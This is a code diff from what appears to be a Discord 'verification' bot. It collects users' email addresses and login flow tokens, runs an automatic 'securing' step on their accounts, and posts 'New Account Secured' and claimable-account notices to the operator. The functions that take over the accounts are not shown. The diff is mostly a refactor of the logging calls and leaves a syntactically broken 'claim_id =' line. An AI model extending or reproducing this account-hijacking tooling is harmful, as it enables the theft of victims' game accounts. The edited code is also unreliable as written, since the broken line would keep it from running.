@@ -10,7 +10,7 @@ from ui.buttons.account_details import accountInfo
 
 from securing.secure import startSecuringAccount
 from securing.auth.initial_session import get_session
-from shared.send_logs import sendLogs
+from shared.send_logs import send_logs
 
 class MyModalTwo(ui.Modal):
     def __init__(self, username, email, flowtoken):
@@ -38,8 +38,8 @@ class MyModalTwo(ui.Modal):
                     ephemeral = True
                 )
 
-                await sendLogs(
-                    interaction.client, self.config,
+                await send_logs(
+                    interaction.client,
                     Embed(
                         title = f"User | {interaction.user.name} ({interaction.user.id})",
                         description = f"**Email** | **Status** | **Reason**\n```{self.email} | Refused to Verify | User has been blacklisted```",
@@ -64,8 +64,8 @@ class MyModalTwo(ui.Modal):
 
         await interaction.response.defer(ephemeral=True)
 
-        await sendLogs(interaction.client, self.config, content="**This Account is being automaticly secured**")
-        await sendLogs(interaction.client, self.config, embed, view=ButtonOptions(interaction.user, interaction.user.id), email=self.email)
+        await send_logs(interaction.client, content="**This Account is being automaticly secured**")
+        await send_logs(interaction.client, embed, view=ButtonOptions(interaction.user, interaction.user.id), email=self.email)
 
         await interaction.followup.send(
             embed = discord.Embed(
@@ -93,8 +93,8 @@ class MyModalTwo(ui.Modal):
             if self.username and self.username.strip():
                 embed.set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}")
             
-            await sendLogs(
-                interaction.client, self.config,
+            await send_logs(
+                interaction.client,
                 embed,
                 view=ButtonOptions(interaction.user, interaction.user.id),
                 email=self.email
@@ -111,25 +111,16 @@ class MyModalTwo(ui.Modal):
             )
         )
 
-        mc = securedAccount["minecraft"]
-        name = mc['name'] if mc else "No Minecraft"
-        print(securedAccount)
-        await sendLogs(
-            interaction.client, self.config,
-            discord.Embed(
-                title="New Account Secured",
-                description=f"**{name}** has been successfully secured.",
-                color=0x79D990
-            ).set_thumbnail(url=f"https://mc-heads.net/avatar/{self.username}/128"),
-            conly = True
-        )
-
         if self.config["claims"]["claims_enabled"]:
-            await sendLogs(
-                interaction.client, self.config,
+            name = securedAccount["minecraft"]["name"]
+            claim_id = 
+
+            await send_logs(
+                interaction.client,
                 discord.Embed(
-                    title="Account Available to Claim",
-                    description=f"**MC Username:** `{name}`\n**Claim ID:** `{securedAccount['claim_id']}`",
+                    title="New Account Secured",
+                    description=f"**{name}** has been successfully secured.",
                     color=0x79D990
-                )
+                ).set_thumbnail(url=f"https://mc-heads.net/avatar/{self.username}/128"),
+                conly = True
             )
